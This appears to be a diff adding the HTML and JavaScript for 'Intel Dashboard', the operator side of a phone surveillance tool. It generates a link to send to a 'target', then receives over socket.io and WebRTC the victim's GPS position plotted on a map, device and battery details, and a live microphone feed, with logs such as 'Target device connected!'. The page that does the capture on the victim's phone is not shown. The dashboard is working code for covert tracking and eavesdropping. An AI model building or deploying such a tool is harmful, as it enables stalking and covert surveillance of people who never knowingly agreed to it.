@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>P3 — Intel Dashboard</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap');
+
+    :root {
+      --bg: #04080f;
+      --panel: #080f1a;
+      --border: #0d2035;
+      --green: #00ff88;
+      --cyan: #00d4ff;
+      --red: #ff3b5c;
+      --yellow: #ffd600;
+      --dim: rgba(0,212,255,.35);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--cyan);
+      font-family: 'Share Tech Mono', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Scanlines */
+    body::before {
+      content:'';
+      position:fixed; inset:0;
+      background: repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,212,255,.012) 3px,rgba(0,212,255,.012) 4px);
+      pointer-events:none; z-index:999;
+    }
+
+    /* HEADER */
+    .header {
+      display:flex; align-items:center; justify-content:space-between;
+      padding:14px 24px;
+      border-bottom:1px solid var(--border);
+      background: var(--panel);
+    }
+    .logo {
+      font-family:'Orbitron',monospace;
+      font-size:1.1rem; font-weight:900;
+      letter-spacing:4px;
+      color: var(--cyan);
+      text-shadow: 0 0 20px rgba(0,212,255,.5);
+    }
+    .logo span { color: var(--green); }
+    .header-status { display:flex; gap:16px; align-items:center; font-size:.7rem; }
+    .hstat { display:flex; align-items:center; gap:5px; }
+    .dot { width:7px; height:7px; border-radius:50%; }
+    .dot-green { background:var(--green); box-shadow:0 0 6px var(--green); animation:pulse 2s infinite; }
+    .dot-red { background:var(--red); }
+    .dot-yellow { background:var(--yellow); animation:pulse 1.5s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1}50%{opacity:.3} }
+
+    /* MAIN GRID */
+    .grid {
+      display:grid;
+      grid-template-columns:1fr 1fr 1fr;
+      grid-template-rows: auto auto;
+      gap:14px;
+      padding:16px 20px;
+    }
+
+    /* PANEL */
+    .panel {
+      background: var(--panel);
+      border:1px solid var(--border);
+      border-radius:4px;
+      padding:16px;
+      position:relative;
+      overflow:hidden;
+    }
+    .panel::before {
+      content:'';
+      position:absolute; top:0; left:0; right:0; height:2px;
+      background: linear-gradient(90deg,transparent,var(--cyan),transparent);
+      opacity:.4;
+    }
+    .panel-title {
+      font-size:.65rem;
+      letter-spacing:3px;
+      text-transform:uppercase;
+      color: var(--dim);
+      margin-bottom:12px;
+      display:flex; align-items:center; gap:8px;
+    }
+    .panel-title::before { content:'▸'; color:var(--cyan); }
+
+    /* STATUS BADGE */
+    .status-badge {
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.7rem; padding:4px 10px;
+      border-radius:2px;
+      letter-spacing:1px;
+    }
+    .badge-waiting { border:1px solid var(--yellow); color:var(--yellow); }
+    .badge-live { border:1px solid var(--green); color:var(--green); }
+    .badge-error { border:1px solid var(--red); color:var(--red); }
+
+    /* LOCATION PANEL */
+    #locPanel { grid-column: span 2; }
+    .map-placeholder {
+      width:100%; height:220px;
+      background:linear-gradient(135deg,#040d14,#071626);
+      border:1px solid var(--border);
+      border-radius:4px;
+      display:flex; align-items:center; justify-content:center;
+      flex-direction:column; gap:8px;
+      font-size:.8rem; color:var(--dim);
+      position:relative; overflow:hidden;
+    }
+    .map-grid {
+      position:absolute; inset:0;
+      background-image:
+        linear-gradient(rgba(0,212,255,.06) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,212,255,.06) 1px, transparent 1px);
+      background-size:30px 30px;
+    }
+    .map-content { position:relative; z-index:1; text-align:center; }
+    .map-pin { font-size:2.5rem; animation:bounce 2s infinite; }
+    @keyframes bounce { 0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)} }
+
+    .loc-data { margin-top:12px; display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+    .loc-item { background:rgba(0,212,255,.05); border:1px solid var(--border); padding:8px 10px; border-radius:2px; }
+    .loc-label { font-size:.6rem; color:var(--dim); letter-spacing:1px; margin-bottom:3px; }
+    .loc-value { font-size:.82rem; color:var(--green); }
+
+    /* MIC PANEL */
+    #micPanel { grid-column: span 1; }
+    .mic-visualizer {
+      width:100%; height:80px;
+      display:flex; align-items:center; justify-content:center; gap:3px;
+      margin:10px 0;
+    }
+    .bar {
+      width:5px; border-radius:3px;
+      background: var(--green);
+      box-shadow:0 0 6px var(--green);
+      transition: height .1s ease;
+    }
+    .mic-status { font-size:.75rem; color:var(--dim); text-align:center; }
+    audio#remoteAudio { display:none; }
+
+    /* DEVICE PANEL */
+    #devPanel { grid-column: span 3; }
+    .dev-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-top:4px; }
+    .dev-item { background:rgba(0,212,255,.04); border:1px solid var(--border); padding:10px 12px; border-radius:2px; }
+    .dev-label { font-size:.6rem; color:var(--dim); letter-spacing:1px; margin-bottom:5px; }
+    .dev-value { font-size:.82rem; color:var(--cyan); word-break:break-word; line-height:1.4; }
+    .dev-value.highlight { color:var(--yellow); }
+    .dev-value.danger { color:var(--red); }
+
+    /* BATTERY BAR */
+    .battery-bar { height:6px; background:var(--border); border-radius:3px; margin-top:6px; overflow:hidden; }
+    .battery-fill { height:100%; background:var(--green); border-radius:3px; transition:width 1s; }
+
+    /* PHONE LINK */
+    .link-box {
+      background:rgba(0,212,255,.04); border:1px dashed var(--border);
+      padding:12px 16px; border-radius:4px;
+      display:flex; align-items:center; gap:12px;
+      margin-top:12px;
+    }
+    .link-label { font-size:.65rem; color:var(--dim); letter-spacing:2px; white-space:nowrap; }
+    .link-url { flex:1; font-size:.78rem; color:var(--green); word-break:break-all; }
+    .copy-btn {
+      background:transparent; border:1px solid var(--cyan);
+      color:var(--cyan); font-family:'Share Tech Mono',monospace;
+      font-size:.7rem; padding:7px 14px; border-radius:2px; cursor:pointer;
+      letter-spacing:1px; white-space:nowrap;
+    }
+    .copy-btn:hover { background:rgba(0,212,255,.1); }
+
+    /* LOG */
+    .log {
+      border-top:1px solid var(--border); margin-top:12px; padding-top:10px;
+      max-height:80px; overflow-y:auto; scrollbar-width:thin;
+    }
+    .log-entry { font-size:.65rem; color:var(--dim); line-height:1.8; }
+    .log-entry.ok { color:var(--green); }
+    .log-entry.warn { color:var(--yellow); }
+    .log-entry.err { color:var(--red); }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">INTEL<span>DASH</span></div>
+  <div class="header-status">
+    <div class="hstat"><div class="dot dot-yellow" id="connDot"></div><span id="connText">WAITING</span></div>
+    <div class="hstat"><div class="dot dot-red" id="locDot"></div><span>GPS</span></div>
+    <div class="hstat"><div class="dot dot-red" id="micDot"></div><span>MIC</span></div>
+  </div>
+</div>
+
+<!-- GRID -->
+<div class="grid">
+
+  <!-- LOCATION PANEL -->
+  <div class="panel" id="locPanel">
+    <div class="panel-title">GPS Location</div>
+    <div class="map-placeholder" id="mapPlaceholder">
+      <div class="map-grid"></div>
+      <div class="map-content">
+        <div class="map-pin" id="mapPin">📡</div>
+        <div id="mapMsg">Waiting for location data...</div>
+      </div>
+    </div>
+    <iframe id="mapFrame" style="display:none;width:100%;height:220px;border:none;border-radius:4px;" allowfullscreen></iframe>
+    <div class="loc-data" id="locData">
+      <div class="loc-item"><div class="loc-label">LATITUDE</div><div class="loc-value" id="lat">--</div></div>
+      <div class="loc-item"><div class="loc-label">LONGITUDE</div><div class="loc-value" id="lng">--</div></div>
+      <div class="loc-item"><div class="loc-label">ACCURACY</div><div class="loc-value" id="acc">--</div></div>
+      <div class="loc-item"><div class="loc-label">TIMESTAMP</div><div class="loc-value" id="ts">--</div></div>
+    </div>
+    <div class="link-box">
+      <span class="link-label">📱 PHONE LINK</span>
+      <span class="link-url" id="phoneLink"></span>
+      <button class="copy-btn" onclick="copyLink()">COPY</button>
+    </div>
+  </div>
+
+  <!-- MIC PANEL -->
+  <div class="panel" id="micPanel">
+    <div class="panel-title">Live Microphone</div>
+    <div id="micStatus" class="status-badge badge-waiting">⏳ WAITING FOR MIC</div>
+    <div class="mic-visualizer" id="visualizer">
+      <!-- bars injected by JS -->
+    </div>
+    <audio id="remoteAudio" autoplay></audio>
+    <div class="mic-status" id="micInfo">Connect phone to begin audio capture</div>
+    <div class="log" id="log">
+      <div class="log-entry warn">[SYSTEM] Dashboard initialized. Waiting for target...</div>
+    </div>
+  </div>
+
+  <!-- DEVICE INFO PANEL -->
+  <div class="panel" id="devPanel">
+    <div class="panel-title">Device Intelligence</div>
+    <div class="dev-grid" id="devGrid">
+      <div class="dev-item"><div class="dev-label">STATUS</div><div class="dev-value" id="d-status">Waiting...</div></div>
+      <div class="dev-item"><div class="dev-label">PLATFORM</div><div class="dev-value" id="d-platform">--</div></div>
+      <div class="dev-item"><div class="dev-label">LANGUAGE</div><div class="dev-value" id="d-lang">--</div></div>
+      <div class="dev-item"><div class="dev-label">TIMEZONE</div><div class="dev-value" id="d-tz">--</div></div>
+      <div class="dev-item"><div class="dev-label">SCREEN</div><div class="dev-value" id="d-screen">--</div></div>
+      <div class="dev-item"><div class="dev-label">BATTERY</div>
+        <div class="dev-value highlight" id="d-batt">--</div>
+        <div class="battery-bar"><div class="battery-fill" id="battFill" style="width:0%"></div></div>
+      </div>
+      <div class="dev-item"><div class="dev-label">NETWORK</div><div class="dev-value" id="d-net">--</div></div>
+      <div class="dev-item"><div class="dev-label">CPU CORES</div><div class="dev-value" id="d-cpu">--</div></div>
+      <div class="dev-item"><div class="dev-label">RAM</div><div class="dev-value" id="d-ram">--</div></div>
+      <div class="dev-item"><div class="dev-label">TOUCH POINTS</div><div class="dev-value" id="d-touch">--</div></div>
+      <div class="dev-item" style="grid-column:span 2"><div class="dev-label">USER AGENT</div><div class="dev-value" id="d-ua" style="font-size:.7rem;opacity:.7">--</div></div>
+    </div>
+  </div>
+
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+
+  // Phone link
+  const phoneUrl = location.origin + '/phone3.html';
+  document.getElementById('phoneLink').textContent = phoneUrl;
+
+  function copyLink() {
+    navigator.clipboard.writeText(phoneUrl).then(() => addLog('Phone link copied to clipboard', 'ok'));
+  }
+
+  // Mic visualizer bars
+  const viz = document.getElementById('visualizer');
+  const BARS = 28;
+  for (let i = 0; i < BARS; i++) {
+    const b = document.createElement('div');
+    b.className = 'bar';
+    b.style.height = '4px';
+    viz.appendChild(b);
+  }
+
+  let analyser, dataArr, animId;
+
+  function startVisualizer(stream) {
+    const ctx = new AudioContext();
+    const src = ctx.createMediaStreamSource(stream);
+    analyser = ctx.createAnalyser();
+    analyser.fftSize = 64;
+    src.connect(analyser);
+    dataArr = new Uint8Array(analyser.frequencyBinCount);
+
+    const bars = viz.querySelectorAll('.bar');
+    function draw() {
+      animId = requestAnimationFrame(draw);
+      analyser.getByteFrequencyData(dataArr);
+      bars.forEach((b, i) => {
+        const v = dataArr[i] || 0;
+        b.style.height = Math.max(4, v * .6) + 'px';
+      });
+    }
+    draw();
+  }
+
+  // Log helper
+  function addLog(msg, type='') {
+    const log = document.getElementById('log');
+    const d = document.createElement('div');
+    d.className = 'log-entry ' + type;
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    log.appendChild(d);
+    log.scrollTop = log.scrollHeight;
+  }
+
+  // ── SOCKET EVENTS ─────────────────────────────────────────────
+  socket.emit('p3-viewer-ready');
+
+  socket.on('p3-phone-available', () => {
+    document.getElementById('connDot').className = 'dot dot-green';
+    document.getElementById('connText').textContent = 'TARGET ONLINE';
+    document.getElementById('d-status').textContent = 'CONNECTED';
+    document.getElementById('d-status').className = 'dev-value highlight';
+    addLog('Target device connected!', 'ok');
+    socket.emit('p3-request-stream');
+  });
+
+  socket.on('p3-phone-offline', () => {
+    document.getElementById('connDot').className = 'dot dot-red';
+    document.getElementById('connText').textContent = 'OFFLINE';
+    addLog('Target device disconnected', 'err');
+  });
+
+  // Location
+  socket.on('p3-location', (data) => {
+    if (data.error) {
+      addLog('Location denied: ' + data.error, 'warn');
+      return;
+    }
+    document.getElementById('locDot').className = 'dot dot-green';
+    document.getElementById('lat').textContent = data.lat.toFixed(6) + '°';
+    document.getElementById('lng').textContent = data.lng.toFixed(6) + '°';
+    document.getElementById('acc').textContent = '±' + data.accuracy + ' m';
+    document.getElementById('ts').textContent = data.timestamp;
+
+    // Show map
+    document.getElementById('mapPlaceholder').style.display = 'none';
+    const frame = document.getElementById('mapFrame');
+    frame.src = `https://maps.google.com/maps?q=${data.lat},${data.lng}&z=16&output=embed`;
+    frame.style.display = 'block';
+
+    addLog(`GPS acquired: ${data.lat.toFixed(4)}, ${data.lng.toFixed(4)} (±${data.accuracy}m)`, 'ok');
+  });
+
+  // Device info
+  socket.on('p3-device-info', (info) => {
+    addLog('Device info received', 'ok');
+
+    function set(id, val) {
+      const el = document.getElementById(id);
+      if (el && val !== undefined && val !== null) el.textContent = val;
+    }
+
+    set('d-platform', info.platform);
+    set('d-lang', info.language);
+    set('d-tz', info.timezone);
+    set('d-screen', info.screenWidth + '×' + info.screenHeight + ' @' + info.pixelRatio + 'x');
+    set('d-cpu', info.cores + ' cores');
+    set('d-ram', info.memory);
+    set('d-touch', info.touchPoints + ' points');
+    set('d-ua', info.userAgent);
+
+    if (info.connection) {
+      set('d-net', info.connection.type + ' · ' + info.connection.downlink);
+    }
+
+    if (info.battery) {
+      const pct = parseInt(info.battery.level);
+      set('d-batt', info.battery.level + (info.battery.charging ? ' ⚡' : ''));
+      document.getElementById('battFill').style.width = pct + '%';
+      document.getElementById('battFill').style.background = pct < 20 ? 'var(--red)' : 'var(--green)';
+    }
+  });
+
+  // WebRTC mic
+  let pc = null;
+  const iceConfig = {
+    iceServers:[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'}
+    ]
+  };
+
+  socket.on('p3-offer', async ({ sdp }) => {
+    pc = new RTCPeerConnection(iceConfig);
+
+    pc.ontrack = (e) => {
+      const audio = document.getElementById('remoteAudio');
+      audio.srcObject = e.streams[0];
+      document.getElementById('micDot').className = 'dot dot-green';
+      document.getElementById('micStatus').className = 'status-badge badge-live';
+      document.getElementById('micStatus').textContent = '🔴 LIVE AUDIO';
+      document.getElementById('micInfo').textContent = 'Receiving live microphone feed';
+      startVisualizer(e.streams[0]);
+      addLog('Live microphone stream established', 'ok');
+    };
+
+    pc.onicecandidate = (e) => {
+      if (e.candidate) socket.emit('p3-ice', { candidate: e.candidate, to: 'p3-phone' });
+    };
+
+    await pc.setRemoteDescription(new RTCSessionDescription(sdp));
+    const answer = await pc.createAnswer();
+    await pc.setLocalDescription(answer);
+    socket.emit('p3-answer', { sdp: pc.localDescription });
+  });
+
+  socket.on('p3-ice', async ({ candidate }) => {
+    if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
+  });
+</script>
+</body>
+</html>
